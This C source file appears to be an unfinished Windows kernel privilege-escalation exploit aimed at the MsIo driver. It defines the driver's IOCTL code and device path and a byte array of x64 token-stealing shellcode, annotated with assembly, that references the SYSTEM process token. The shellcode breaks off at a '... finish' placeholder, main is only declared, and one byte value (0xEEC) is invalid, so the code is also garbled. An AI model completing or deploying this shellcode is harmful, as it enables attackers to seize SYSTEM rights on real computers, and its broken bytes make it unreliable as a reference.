#include <Windows.h>
#include <stdio.h>

#define IOCTL_MSIO_READPORT 0x80102050

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\MsIo"

char token_stealing_shellcode[] = {
	0x48, 0x83, 0xEC, 0x68,									// sub	rsp, 68h
	0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,	// mov	[rsp+28h], 0
	0xFF, 0x15, 0x75, 0x10, 0x00, 0x00,						// call	[PsGetCurrentProcessId]
	0x48, 0x8D, 0x54, 0x24, 0x28,							// lea	rdx, [rsp+28h]
	0x48, 0x8B, 0xC8,										// mov	rcx, rax
	0xFF, 0x15, 0x27, 0x10, 0x00, 0x00,						// call	[PsLookupProcessByProcessId]
	0x89, 0x44, 0x24, 0x20,									// mov	[rsp+20h], eax
	0x48, 0x8B, 0x4C, 0x24, 0x28,							// mov	rcx, [rsp+28h]
	0xFF, 0x15, 0x50, 0x10, 0x00, 0x00,						// call [PsReferencePrimaryToken]
	0x48, 0x89, 0x44, 0x24, 0x48,							// mov	[rsp+48h], rax
	0x48, 0x8B, 0x05, 0xEEC, 0x0F, 0x00, 0x00,				// mov	rax, [PsInitialSystemProcess]
	0x48, 0x8B, 0x08,										// mov	rcx, [rax]
	0xFF, 0x15, 0x3B, 0x10, 0x00, 0x00,						// call [PsReferencePrimaryToken]
	0x48, 0x89, 0x44, 0x24, 0x50,							// mov	[rsp+50h], rax
	0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,	// mov	[rsp+30h], 0
	0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00,	// mov	[rsp+40h], 0
	0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,	// mov	[rsp+38h], 0

	// ... finish
};

int main(int argc, char** argv);